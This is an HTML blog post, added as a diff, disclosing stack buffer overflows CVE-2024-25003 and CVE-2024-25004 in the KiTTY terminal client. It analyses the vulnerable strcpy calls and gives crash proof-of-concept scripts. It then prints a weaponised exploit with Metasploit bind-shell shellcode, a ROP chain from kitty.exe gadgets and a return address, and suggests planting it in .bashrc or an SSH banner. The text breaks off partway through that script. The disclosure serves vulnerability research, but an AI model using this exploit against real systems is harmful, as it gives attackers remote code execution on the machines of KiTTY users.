@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Author: Austin A. DeFrancesco, Subject: Cybersecurity, Categroy: Blog">
+
+  <title>
+    
+      Buffer Overflow Vulnerabilities in KiTTY Start Duplicated Session Hostname (CVE-2024-25003) & Username (CVE-2024-25004) Variables &middot; BRIDGEBLOG
+    
+  </title>
+
+  <link rel="stylesheet" href="/styles.css">
+  <link rel="alternate" type="application/atom+xml" title="BRIDGEBLOG" href="/feed.xml">
+  
+  
+  <link rel="apple-touch-icon-precomposed" sizes="180x180" href="/public/apple-touch-icon-precomposed.png?v=20251026">
+  <link rel="icon" type="image/png" sizes="32x32" href="/public/favicon-32x32.png?v=20251026">
+  <link rel="icon" type="image/png" sizes="16x16" href="/public/favicon-16x16.png?v=20251026">
+  <link rel="shortcut icon" href="/public/favicon.ico?v=20251026">
+
+  <link href='https://fonts.googleapis.com/css?family=PT+Serif:400,700,400italic' rel='stylesheet' type='text/css'>
+</head>
+
+  <body>
+
+    <div class="container content"> 
+      
+<header class="site-header fixed-banner">
+    <h3 class="site-title">
+      <a href="/" title="Home">BRIDGEBLOG</a>
+      <small>bridging nerdy stuff to pursue pleasant elegance</small>
+    </h3>
+</header>
+
+
+
+      <main>
+        <article class="post">
+  <h1 class="post-title">Buffer Overflow Vulnerabilities in KiTTY Start Duplicated Session Hostname (CVE-2024-25003) & Username (CVE-2024-25004) Variables</h1>
+  <h2 id="contents">Contents:</h2>
+
+<ol>
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#recon">Analysis</a></li>
+  <li><a href="#exploitation">Exploitation</a></li>
+  <li><a href="#acknowledgments">Acknowledgments</a></li>
+  <li><a href="#timeline">Timeline</a></li>
+  <li><a href="#additional">Additional Advisory</a></li>
+</ol>
+
+<h2 id="summary-">Summary: <a name="summary"></a></h2>
+
+<p>Austin A. DeFrancesco (DEFCESCO) discovered two stack-based buffer overflow vulnerabilities in KiTTY (<a href="https://github.com/cyd01/KiTTY/blob/75fa2abcd220c17249ff7252f8d5224137001f2d/kitty.c#L2597-L2602">https://github.com/cyd01/KiTTY/</a>). These vulnerabilities:</p>
+
+<ul>
+  <li>Are exploitable by any KiTTY user connecting to a host with the embedded exploit;</li>
+  <li>The vulnerabilities were introduced in the original release in May 2021 (commit 4f79b1e) and affect all versions up to KiTTY ≤ 0.76.1.13 in their default configuration.</li>
+</ul>
+
+<p>Austin developed an exploit for these vulnerabilities and obtained remote code execution in the context of the user running the application; by default, KiTTY can be operated in the user permission group of Standard Users. These exploits are stable and repeatable on all Microsoft Windows operating systems 11/10/8/7/XP.</p>
+
+<h2 id="analysis-">Analysis: <a name="analysis"></a></h2>
+
+<p>CVE-2024-25003 and CVE-2024-25004 buffer overflow vulnerabilities are in <code class="language-plaintext highlighter-rouge">kitty.c</code>. The vulnerable lines of code are on lines <code class="language-plaintext highlighter-rouge">2597-2602</code>; in the latest revision <code class="language-plaintext highlighter-rouge">75fa2abcd220c172</code> (<a href="https://github.com/cyd01/KiTTY/blob/75fa2abcd220c17249ff7252f8d5224137001f2d/kitty.c#L2597-L2602">kitty.c#L2597-L2602</a>).</p>
+
+<p>If KiTTY encounters the ANSI escape sequence <code class="language-plaintext highlighter-rouge">\033]0;__dt</code> in a stream, it interprets it as an instruction to create a duplicate terminal session:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">\033</code>: This is the escape character (octal representation of ASCII ESC), which signals the beginning of an escape sequence.</li>
+  <li><code class="language-plaintext highlighter-rouge">]0;</code>: This sequence part indicates a metacommand will be defined.</li>
+  <li><code class="language-plaintext highlighter-rouge">__dt</code>: This is the vulnerable KiTTY command to duplicate the terminal, which takes inputs of hostname and username.</li>
+  <li><code class="language-plaintext highlighter-rouge">\077</code>: This is the terminator sequence to indicate the end of the escape sequence.</li>
+  <li>KiTTY’s <code class="language-plaintext highlighter-rouge">kitty.c</code> <code class="language-plaintext highlighter-rouge">__dt</code> command checks if the first three characters of the string <code class="language-plaintext highlighter-rouge">cmd</code> are <code class="language-plaintext highlighter-rouge">d</code>, <code class="language-plaintext highlighter-rouge">t</code>, and <code class="language-plaintext highlighter-rouge">:</code>, respectively.</li>
+</ul>
+
+<p>If the condition is true (at line 2596), an array <code class="language-plaintext highlighter-rouge">host</code> and <code class="language-plaintext highlighter-rouge">user</code> will be declared with a size of 1024 and 256 (at line 2597), respectively, and initialized with an empty string.</p>
+
+<p>CVE-2024-25003, where the hostname is vulnerable to a stack-based buffer overflow, occurs due to insufficient bounds checking and input sanitization (at line 2600). This allows an attacker to overwrite adjacent memory, which leads to arbitrary code execution.</p>
+
+<p>CVE-2024-25004, where the username is vulnerable to a stack-based buffer overflow, occurs due to insufficient bounds checking and input sanitization (at line 2600). This allows an attacker to overwrite adjacent memory, which leads to arbitrary code execution.</p>
+
+<p>Because <code class="language-plaintext highlighter-rouge">RemotePath</code> is created from a size calculated at runtime, <code class="language-plaintext highlighter-rouge">RemotePath</code> is not vulnerable to an overflow. It should be noted that <code class="language-plaintext highlighter-rouge">RemotePath</code> may be a <code class="language-plaintext highlighter-rouge">NULL</code> pointer if the allocation fails.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">strcpy(host, cmd + 3);</code> copies the substring of <code class="language-plaintext highlighter-rouge">cmd</code> starting from the 4th character (index 3) into the <code class="language-plaintext highlighter-rouge">host</code> array (at line 2601).</li>
+  <li><code class="language-plaintext highlighter-rouge">i = poss(":", host);</code> assumes there’s a function <code class="language-plaintext highlighter-rouge">poss</code> that finds the position of the <code class="language-plaintext highlighter-rouge">:</code> character in the <code class="language-plaintext highlighter-rouge">host</code> string and assigns it to the variable <code class="language-plaintext highlighter-rouge">i</code> (at line 2601).</li>
+  <li><code class="language-plaintext highlighter-rouge">strcpy(user, host + i);</code> copies the substring of <code class="language-plaintext highlighter-rouge">host</code> starting from the position after <code class="language-plaintext highlighter-rouge">:</code> into the <code class="language-plaintext highlighter-rouge">user</code> array (at line 2602).</li>
+</ol>
+
+<hr />
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">2596</span> <span class="nf">if</span><span class="p">(</span> <span class="p">(</span><span class="n">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="sc">'d'</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="n">cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="sc">'t'</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="n">cmd</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="sc">':'</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// __dt: start a duplicated session in same directory, same host and same user : dt() { printf "\033]0;__dt:"$(hostname)":"${USER}":"`pwd`"\007" ; }</span>
+<span class="mi">2597</span>       <span class="kt">char</span> <span class="n">host</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="o">=</span><span class="s">""</span><span class="p">;</span><span class="kt">char</span> <span class="n">user</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="o">=</span><span class="s">""</span><span class="p">;</span>
+<span class="mi">2598</span>       <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+<span class="mi">2599</span>       <span class="k">if</span><span class="p">(</span> <span class="n">RemotePath</span><span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="n">free</span><span class="p">(</span> <span class="n">RemotePath</span> <span class="p">)</span> <span class="p">;</span>
+<span class="mi">2600</span>       <span class="n">RemotePath</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="p">)</span> <span class="p">;</span>
+<span class="mi">2601</span>       <span class="n">strcpy</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">cmd</span><span class="o">+</span><span class="mi">3</span><span class="p">);</span><span class="n">i</span><span class="o">=</span><span class="n">poss</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span><span class="n">host</span><span class="p">);</span>
+<span class="mi">2602</span>       <span class="n">strcpy</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">host</span><span class="o">+</span><span class="n">i</span><span class="p">);</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="exploitation-">Exploitation: <a name="exploitation"></a></h2>
+
+<h3 id="__dt-hostname--username-buffer-overflows">__dt Hostname &amp; Username Buffer Overflows:</h3>
+
+<p>From an attacker’s point of view, the exploits for CVE-2024-25003 and CVE-2024-25004 can be inserted into the <code class="language-plaintext highlighter-rouge">.bashrc</code> file for all users or in the SSH warning/message of the day (MOTD) banner. The exploit(s) will trigger once the user logs in or is presented with the SSH warning/MOTD banner.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HOSTNAME CRASH:
+(47c.23ac): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000001 ebx=41414141 ecx=861615a9 edx=01130000 esi=41414141 edi=41414141
+eip=41414141 esp=0084e790 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+41414141 ??              ???
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USERNAME CRASH:
+(af8.ab0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000001 ebx=41414141 ecx=02f92491 edx=01120000 esi=41414141 edi=41414141
+eip=41414141 esp=0084e790 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+41414141 ??              ???
+</code></pre></div></div>
+
+<p>KiTTY’s <code class="language-plaintext highlighter-rouge">__dt</code> function crashed (at line 2601) because adjacent memory was overwritten.</p>
+
+<p>To reproduce the vulnerability, follow these steps:</p>
+
+<ol>
+  <li>Start KiTTY and start an SSH session.</li>
+  <li>Save the proof of concept (PoC) on the connected SSH session.</li>
+  <li>Execute the PoC(s) using Python: <code class="language-plaintext highlighter-rouge">python3 developer_CVE-2024-25003.py</code> or <code class="language-plaintext highlighter-rouge">python3 developer_CVE-2024-25004</code>.</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="c1">#-------------------------------------------------------------------------------------#
+# Crash: KiTTY ≤ 0.76.1.13 Buffer Overflow Vulnerability in KiTTY Start               #
+#        Duplicated Session Hostname Variable (CVE-2024-25003)                        #
+# OS: Microsoft Windows 11/10/8/7/XP                                                  #
+# Author: DEFCESCO (Austin A. DeFrancesco)                                            #
+# Software:                                                                           #
+# https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip #
+#-------------------------------------------------------------------------------------#
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">sequence</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">1309</span> 
+
+<span class="n">escape_sequence</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\033</span><span class="s">]0;__dt:'</span> <span class="o">+</span> <span class="n">sequence</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\007</span><span class="s">'</span>
+<span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'wb'</span><span class="p">)</span> 
+<span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">escape_sequence</span><span class="p">)</span>
+<span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="c1">#-------------------------------------------------------------------------------------#
+# Crash: KiTTY ≤ 0.76.1.13 Buffer Overflow Vulnerability in KiTTY Start               #
+#        Duplicated Session Username Variable (CVE-2024-25004)                        #
+# OS: Microsoft Windows 11/10/8/7/XP                                                  #
+# Author: DEFCESCO (Austin A. DeFrancesco)                                            #
+# Software:                                                                           #
+# https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip #
+#-------------------------------------------------------------------------------------#
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">sequence</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">1309</span> 
+
+<span class="n">escape_sequence</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\033</span><span class="s">]0;__dt:localhost:'</span> <span class="o">+</span> <span class="n">sequence</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\007</span><span class="s">'</span>
+<span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'wb'</span><span class="p">)</span> 
+<span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">escape_sequence</span><span class="p">)</span>
+<span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="exploits">Exploits:</h3>
+<p>To reproduce these exploits, follow these steps:</p>
+
+<ol>
+  <li>Start KiTTY and start an SSH session.</li>
+  <li>Save the proof of concept exploit(s) on the connected SSH session.</li>
+  <li>Update the payload handler and payload documented in the exploit’s comments.</li>
+  <li>Execute the exploit(s) using Python: <code class="language-plaintext highlighter-rouge">python3 CVE-2024-25003.py</code> or <code class="language-plaintext highlighter-rouge">python3 CVE-2024-25004.py</code>.</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="c1">#-------------------------------------------------------------------------------------#
+# Exploit: KiTTY ≤ 0.76.1.13 Buffer Overflow Vulnerability in KiTTY Start             #
+#        Duplicated Session Hostname Variable (CVE-2024-25003)                        #
+# OS: Microsoft Windows 11/10/8/7/XP                                                  #
+# Author: DEFCESCO (Austin A. DeFrancesco)                                            #
+# Software:                                                                           #
+# https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip #
+#-------------------------------------------------------------------------------------#
+# More details can be found on my blog: https://blog.DEFCESCO.io/Hell0+KiTTY          #
+#-------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) &gt; to_handler                                   #
+# [*] Payload Handler Started as Job 1                                                #
+# msf6 payload(windows/shell_bind_tcp) &gt;                                              #
+# [*] Started bind TCP handler against 192.168.100.28:4444                            #
+# [*] Command shell session 1 opened (192.168.100.119:39315 -&gt; 192.168.100.28:4444)   # 
+#-------------------------------------------------------------------------------------#
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="c1">#---------------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) &gt; generate -b '\x00\x07\x0a\x0d\x1b\x9c\x3A\x40' -f py #
+# windows/shell_bind_tcp - 375 bytes                                                          #
+# https://metasploit.com/                                                                     #
+# Encoder: x86/xor_poly                                                                       #
+# VERBOSE=false, LPORT=4444, RHOST=192.168.100.28,                                            #
+# PrependMigrate=false, EXITFUNC=process, CreateSession=true,                                 #
+# AutoVerifySession=true                                                                      #
+#---------------------------------------------------------------------------------------------#
+</span>
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x53\x56\x57\xdb\xd9\xd9\x74\x24\xf4\x5f\x41</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x49\x31\xc9\x51\x59\x90\x90\x81\xe9\xae\xff\xff</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xff\xbe\xd4\xa1\xc4\xf4\x31\x77\x2b\x83\xef\xfc</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x59\x90\xff\xc9\x75\xf3\x5f\x5e\x5b\x59\x28</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x49\x46\xf4\xd4\xa1\xa4\x7d\x31\x90\x04\x90\x5f</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf1\xf4\x7f\x86\xad\x4f\xa6\xc0\x2a\xb6\xdc\xdb</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x16\x8e\xd2\xe5\x5e\x68\xc8\xb5\xdd\xc6\xd8\xf4</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x60\x0b\xf9\xd5\x66\x26\x06\x86\xf6\x4f\xa6\xc4</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x2a\x8e\xc8\x5f\xed\xd5\x8c\x37\xe9\xc5\x25\x85</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x2a\x9d\xd4\xd5\x72\x4f\xbd\xcc\x42\xfe\xbd\x5f</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x95\x4f\xf5\x02\x90\x3b\x58\x15\x6e\xc9\xf5\x13</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x99\x24\x81\x22\xa2\xb9\x0c\xef\xdc\xe0\x81\x30</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf9\x4f\xac\xf0\xa0\x17\x92\x5f\xad\x8f\x7f\x8c</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xbd\xc5\x27\x5f\xa5\x4f\xf5\x04\x28\x80\xd0\xf0</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xfa\x9f\x95\x8d\xfb\x95\x0b\x34\xfe\x9b\xae\x5f</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xb3\x2f\x79\x89\xc9\xf7\xc6\xd4\xa1\xac\x83\xa7</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x93\x9b\xa0\xbc\xed\xb3\xd2\xd3\x5e\x11\x4c\x44</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xa0\xc4\xf4\xfd\x65\x90\xa4\xbc\x88\x44\x9f\xd4</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x5e\x11\x9e\xdc\xf8\x94\x16\x29\xe1\x94\xb4\x84</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc9\x2e\xfb\x0b\x41\x3b\x21\x43\xc9\xc6\xf4\xc5</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xfd\x4d\x12\xbe\xb1\x92\xa3\xbc\x63\x1f\xc3\xb3</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x5e\x11\xa3\xbc\x16\x2d\xcc\x2b\x5e\x11\xa3\xbc</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd5\x28\xcf\x35\x5e\x11\xa3\x43\xc9\xb1\x9a\x99</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc0\x3b\x21\xbc\xc2\xa9\x90\xd4\x28\x27\xa3\x83</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf6\xf5\x02\xbe\xb3\x9d\xa2\x36\x5c\xa2\x33\x90</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x85\xf8\xf5\xd5\x2c\x80\xd0\xc4\x67\xc4\xb0\x80</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf1\x92\xa2\x82\xe7\x92\xba\x82\xf7\x97\xa2\xbc</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd8\x08\xcb\x52\x5e\x11\x7d\x34\xef\x92\xb2\x2b</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x91\xac\xfc\x53\xbc\xa4\x0b\x01\x1a\x34\x41\x76</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf7\xac\x52\x41\x1c\x59\x0b\x01\x9d\xc2\x88\xde</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x21\x3f\x14\xa1\xa4\x7f\xb3\xc7\xd3\xab\x9e\xd4</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf2\x3b\x21</span><span class="s">"</span>
+
+<span class="k">def</span> <span class="nf">shellcode</span><span class="p">():</span>
+	<span class="n">sc</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xBB\x44\x24\x44\x44</span><span class="s">'</span> <span class="c1"># mov    ebx,0x44442444
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xB8\x44\x44\x44\x44</span><span class="s">'</span> <span class="c1"># mov    eax,0x44444444
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x29\xD8</span><span class="s">'</span>             <span class="c1"># sub    eax,ebx
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x29\xC4</span><span class="s">'</span>             <span class="c1"># sub    esp,eax
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="n">buf</span>
+	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1052</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
+	<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1052</span> 
+	<span class="k">return</span> <span class="n">sc</span>
+
+<span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
+
+	<span class="c1"># rop chain generated with mona.py - www.corelan.be
+</span>	<span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="c1">#[---INFO:gadgets_to_set_esi:---]
+</span>	<span class="mh">0x004c5832</span><span class="p">,</span>  <span class="c1"># POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe]
+</span>	<span class="mh">0x006424a4</span><span class="p">,</span>  <span class="c1"># ptr to &amp;VirtualProtect() [IAT kitty.exe]
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x00484e07</span><span class="p">,</span>  <span class="c1"># MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe]
+</span>	<span class="mh">0x00473cf6</span><span class="p">,</span>  <span class="c1"># XCHG EAX,ESI # RETN [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_ebp:---]
+</span>	<span class="mh">0x00429953</span><span class="p">,</span>  <span class="c1"># POP EBP # RETN [kitty.exe]
+</span>	<span class="mh">0x005405b0</span><span class="p">,</span> <span class="c1"># push esp; ret 0 [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_ebx:---]
+</span>	<span class="mh">0x0049d9f9</span><span class="p">,</span>  <span class="c1"># POP EBX # RETN [kitty.exe]
+</span>	<span class="mh">0x00000201</span><span class="p">,</span>  <span class="c1"># 0x00000201-&gt; ebx
+</span>	<span class="c1">#[---INFO:gadgets_to_set_edx:---]
+</span>	<span class="mh">0x00430dce</span><span class="p">,</span>  <span class="c1"># POP EDX # RETN [kitty.exe]
+</span>	<span class="mh">0x00000040</span><span class="p">,</span>  <span class="c1"># 0x00000040-&gt; edx
+</span>	<span class="c1">#[---INFO:gadgets_to_set_ecx:---]
+</span>	<span class="mh">0x005ac58c</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [kitty.exe]
+</span>	<span class="mh">0x004d81d9</span><span class="p">,</span>  <span class="c1"># &amp;Writable location [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_edi:---]
+</span>	<span class="mh">0x004fa404</span><span class="p">,</span>  <span class="c1"># POP EDI # RETN [kitty.exe]
+</span>	<span class="mh">0x005a2001</span><span class="p">,</span>  <span class="c1"># RETN (ROP NOP) [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_eax:---]
+</span>	<span class="mh">0x004cd011</span><span class="p">,</span>  <span class="c1"># POP EAX # POP EBX # RETN [kitty.exe]
+</span>	<span class="mh">0x90909090</span><span class="p">,</span>  <span class="c1"># nop
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="c1">#[---INFO:pushad:---]
+</span>	<span class="mh">0x005dfbac</span><span class="p">,</span>  <span class="c1"># PUSHAD # RETN [kitty.exe]
+</span>	<span class="p">]</span>
+	<span class="k">return</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
+
+<span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
+
+<span class="c1">#----------------------------------------------------------------------------------#
+# Badchars: \x00\x07\x0a\x0d\x1b\x9c\x3A\x40                                       #
+# Return Address Information: 0x0052033c : {pivot 332 / 0x14c} :                   #
+#   ADD ESP,13C # POP EBX # POP ESI # POP EDI # POP EBP # RETN                     #
+#   ** [kitty.exe] **   |  startnull,ascii {PAGE_EXECUTE_READWRITE}                #
+# Shellcode size at ESP: 1052                                                      #
+#----------------------------------------------------------------------------------#
+</span>
+<span class="n">return_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span>  <span class="mh">0x0052033c</span><span class="p">)</span> <span class="c1"># ADD ESP,13C # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [kitty.exe] **   |  startnull,ascii {PAGE_EXECUTE_READWRITE}
+</span>
+<span class="n">rop_chain_padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">35</span> 
+<span class="n">nops</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">88</span>
+
